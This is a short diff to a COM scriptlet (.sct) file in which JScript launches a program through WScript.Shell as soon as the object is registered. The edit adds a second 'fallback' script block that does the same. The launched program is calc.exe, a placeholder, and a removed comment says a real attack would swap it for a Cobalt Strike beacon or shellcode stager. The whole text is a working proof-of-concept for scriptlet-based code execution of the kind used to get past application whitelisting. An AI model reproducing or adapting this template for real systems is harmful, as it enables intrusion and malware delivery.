@@ -5,9 +5,16 @@
     classid="{F0001111-0000-0000-0000-000000000000}" >
     <script language="JScript">
         <![CDATA[
-            var r = new ActiveXObject("WScript.Shell").Run("calc.exe", 0); 
-            // In a real attack, replace calc.exe with a Cobalt Strike beacon or shellcode stager
+            // This runs as soon as the object is registered
+            var r = new ActiveXObject("WScript.Shell").Run("calc.exe", 0);
         ]]>
     </script>
 </registration>
+
+<script language="JScript">
+    <![CDATA[
+        // This acts as a fallback for some execution methods
+        var r = new ActiveXObject("WScript.Shell").Run("calc.exe", 0);
+    ]]>
+</script>
 </scriptlet>
